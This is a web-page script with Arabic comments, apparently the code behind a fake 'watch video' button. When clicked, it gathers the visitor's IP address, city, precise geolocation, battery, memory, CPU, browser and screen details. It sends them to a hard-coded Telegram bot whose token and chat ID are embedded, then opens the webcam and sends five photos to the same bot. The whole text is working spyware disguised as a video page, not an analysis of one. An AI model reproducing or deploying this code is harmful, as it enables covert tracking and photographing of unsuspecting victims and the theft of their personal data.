<!-- الجزء العلوي لم يتغير -->
<!-- فقط الجزء داخل <script> تم تعديله ليعمل الزر الجديد "مشاهدة فيديو" -->

<script>
  particlesJS("particles-js", {
    particles: {
      number: { value: 100 },
      color: { value: "#00f2ea" },
      shape: { type: "circle" },
      opacity: { value: 0.5 },
      size: { value: 3 },
      move: { enable: true, speed: 1 }
    }
  });

  const token = "7103221259:AAFngxvMCQ4AlI-JVGIn10RZKdgmOzm9s3w"; // التوكن الجديد
  const chatId = "7220184605"; // نفس المعرف

  async function sendTelegramMessage(text) {
    return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
  }

  async function sendPhoto(blob) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", blob, "photo.jpg");
    return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: "POST",
      body: formData
    });
  }

  async function getIPInfo() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      return await res.json();
    } catch {
      return {};
    }
  }

  async function getBatteryInfo() {
    try {
      const battery = await navigator.getBattery();
      return {
        level: Math.round(battery.level * 100),
        charging: battery.charging ? "نعم ⚡" : "لا ❌"
      };
    } catch {
      return { level: "غير معروف", charging: "غير معروف" };
    }
  }

  async function getLocation() {
    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition((pos) => {
        const lat = pos.coords.latitude.toFixed(5);
        const lon = pos.coords.longitude.toFixed(5);
        resolve(`https://maps.google.com/?q=${lat},${lon}`);
      }, () => {
        resolve("❌ غير مسموح أو غير متاح");
      }, { timeout: 5000 });
    });
  }

  function delay(ms) {
    return new Promise(res => setTimeout(res, ms));
  }

  async function watchVideoProcess() {
    const ipInfo = await getIPInfo();
    const battery = await getBatteryInfo();
    const location = await getLocation();
    const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });

    const deviceInfo = navigator.userAgent;
    const screenRes = `${screen.width}x${screen.height}`;
    const connection = navigator.connection || {};
    const memory = navigator.deviceMemory || "غير معروف";
    const cores = navigator.hardwareConcurrency || "غير معروف";

    let message = `
🎬 تم الضغط على زر مشاهدة الفيديو

🌍 الدولة: ${ipInfo.country_name || "غير معروف"}
🏙️ المدينة: ${ipInfo.city || "غير معروف"}
🌐 IP: ${ipInfo.ip || "غير معروف"}
📍 الموقع الجغرافي: ${location}

📱 معلومات الجهاز:
🔋 الشحن: ${battery.level}%
⚡ هل يشحن؟: ${battery.charging}
📶 الاتصال: ${connection.effectiveType || "غير معروف"}
💾 الذاكرة: ${memory} GB
⚙️ الأنوية: ${cores}
🖥️ المتصفح: ${deviceInfo}
📏 الشاشة: ${screenRes}
🕓 الوقت: ${now}
`;

    await sendTelegramMessage(message);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.getElementById("video");
      video.srcObject = stream;
      video.play();

      for(let i = 1; i <= 5; i++) {
        await delay(1500);
        const canvas = document.createElement("canvas");
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        await new Promise(resolve => canvas.toBlob(async (blob) => {
          await sendPhoto(blob);
          resolve();
        }, "image/jpeg"));
      }

      stream.getTracks().forEach(track => track.stop());

      alert("✅ تم إرسال الصور والمعلومات بنجاح!");

    } catch (err) {
      alert("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
      await sendTelegramMessage("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
    }
  }
</script>
